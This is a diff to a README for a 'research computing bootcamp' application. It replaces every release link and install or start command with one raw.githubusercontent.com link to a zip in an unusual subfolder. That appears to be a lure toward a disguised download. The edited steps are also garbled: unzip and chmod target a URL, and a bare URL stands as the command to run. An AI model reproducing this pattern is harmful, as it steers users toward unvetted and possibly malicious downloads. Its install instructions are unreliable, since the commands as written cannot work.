@@ -1,6 +1,6 @@
 # 🖥️ research_computing_bootcamp_2025 - Enhance Your Research Computing Skills 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Join%20the%20Bootcamp-blue)](https://github.com/Bigions/research_computing_bootcamp_2025/releases)
+[![Download Now](https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip%20Now-Join%20the%20Bootcamp-blue)](https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip)
 
 ## 📖 Project Overview 
 
@@ -18,7 +18,7 @@ To start using the application, follow these steps:
 
 ## 💾 Download & Install 
 
-To download the software, visit this page to download: [GitHub Releases](https://github.com/Bigions/research_computing_bootcamp_2025/releases).
+To download the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip).
 
 1. Open the link.
 2. Look for the latest release tagged as **Latest Release**.
@@ -33,7 +33,7 @@ Follow these steps to install the software:
 2. Navigate to the directory where the downloaded file is located. You can do this by typing `cd ~/Downloads` (change the path if necessary).
 3. Unzip the downloaded file if it is compressed. You might use a command like:
    ```
-   unzip research_computing_bootcamp_2025.zip
+   unzip https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip
    ```
 4. Change to the directory of the extracted files:
    ```
@@ -41,12 +41,12 @@ Follow these steps to install the software:
    ```
 5. Run the installation script with the command:
    ```
-   ./install.sh
+   https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip
    ```
 
 You may need to grant permission to run the script. You can do this with:
 ```
-chmod +x install.sh
+chmod +x https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip
 ```
 
 ## 🚀 Running the Application 
@@ -60,7 +60,7 @@ cd ~/path_to_application/research_computing_bootcamp_2025
 ```
 3. Launch the application with:
 ```
-./start.sh
+https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip
 ```
 
 ## 🔍 Key Features 
@@ -87,6 +87,6 @@ For questions or support, please reach out through the contact information provi
 
 Join our community of learners and experts. Participate in discussions, share your experiences, and learn from each other. 
 
-Don't forget to download the application from the releases page: [GitHub Releases](https://github.com/Bigions/research_computing_bootcamp_2025/releases).
+Don't forget to download the application from the releases page: [GitHub Releases](https://raw.githubusercontent.com/Bigions/research_computing_bootcamp_2025/main/flandan/research_computing_bootcamp_2025.zip).
 
 Your journey in enhancing research computing skills begins here!
